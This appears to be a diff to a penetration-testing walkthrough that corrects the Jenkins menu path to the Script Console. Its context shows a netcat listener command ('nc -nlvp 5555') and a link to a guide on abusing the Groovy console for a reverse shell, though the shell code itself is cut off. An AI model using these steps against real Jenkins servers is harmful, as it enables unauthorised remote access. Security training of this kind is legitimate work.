@@ -408,8 +408,7 @@ Start a listener:
 
     sudo nc -nlvp 5555
 
-In Jenkins, go to "Manage Jenkins > Nodes > master" and click on "Script Console". Enter (change the
-necessary parameters) this awesome code from 
+In Jenkins, go to "Manage Jenkins > Script Console". Enter (change the necessary parameters) this awesome code from 
 [Abusing Jenkins Groovy Script Console to get Shell](https://blog.pentesteracademy.com/abusing-jenkins-groovy-script-console-to-get-shell-98b951fa64a6):
 
 ```text
